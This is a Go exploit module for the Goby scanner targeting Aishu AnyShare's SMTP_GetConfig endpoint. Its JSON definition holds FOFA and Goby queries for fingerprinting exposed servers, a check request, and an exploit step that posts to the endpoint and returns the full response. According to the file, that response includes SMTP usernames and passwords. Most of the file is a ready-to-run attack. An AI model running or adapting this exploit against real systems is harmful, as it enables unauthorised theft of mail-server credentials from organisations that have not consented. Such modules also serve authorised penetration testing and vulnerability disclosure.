package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Aishu AnyShare /api/ShareMgnt/SMTP_GetConfig Information Disclosure Vulnerability",
    "Description": "<p>The SMTP_GetConfig interface of AnyShare has an information disclosure vulnerability. An attacker can exploit this interface to retrieve sensitive configuration details, such as the username and password for the SMTP server.</p><p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Product": "AISHU-AnyShare",
    "Homepage": "https://www.eisoo.com/",
    "DisclosureDate": "2025-01-07",
    "PostTime": "2025-01-08",
    "Author": "1971714067@qq.com",
    "FofaQuery": "(body=\"res/libs/webuploader/webuploader.css\" && body=\"src=\\\"/res/libs/base64.min.js\\\"\") || (body=\"以下meta会导致ShareWeb手机访问预览过大，暂先屏蔽\" && body=\"ng-controller=\\\"MessageController\\\">\")",
    "GobyQuery": "(body=\"res/libs/webuploader/webuploader.css\" && body=\"src=\\\"/res/libs/base64.min.js\\\"\") || (body=\"以下meta会导致ShareWeb手机访问预览过大，暂先屏蔽\" && body=\"ng-controller=\\\"MessageController\\\">\")",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.aishu.cn/\">https://www.aishu.cn/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/AimjTR0a5zfuJNRi1pe_Pw"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "value",
            "type": "input",
            "value": "{}",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/ShareMgnt/SMTP_GetConfig",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": "",
                        "visible": false
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "email",
                        "bz": "",
                        "visible": false
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "null",
                        "bz": "",
                        "visible": false
                    }
                ],
                "visible": false
            },
            "SetVariable": [
                "VulURL|lastbody|variable|{{{fixedhostinfo}}}/api/ShareMgnt/SMTP_GetConfig"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/ShareMgnt/SMTP_GetConfig",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{{{value}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "email",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "null",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "test|lastbody|regex|([\\s\\S]*)",
                "output|lastbody|text|{{{test}}}"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "爱数 AnyShare /api/ShareMgnt/SMTP_GetConfig 信息泄露漏洞",
            "Product": "AISHU-AnyShare",
            "Description": "<p>爱数AnyShare的SMTP_GetConfig接口存在信息泄露漏洞。攻击者可以通过该接口获取到敏感的配置信息，例如SMTP服务器的用户名和密码等。<br></p><p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.aishu.cn/\">https://www.aishu.cn/</a><br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Aishu AnyShare /api/ShareMgnt/SMTP_GetConfig Information Disclosure Vulnerability",
            "Product": "AISHU-AnyShare",
            "Description": "<p>The SMTP_GetConfig interface of AnyShare has an information disclosure vulnerability. An attacker can exploit this interface to retrieve sensitive configuration details, such as the username and password for the SMTP server.<br></p><p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.aishu.cn/\">https://www.aishu.cn/</a><br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9983"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
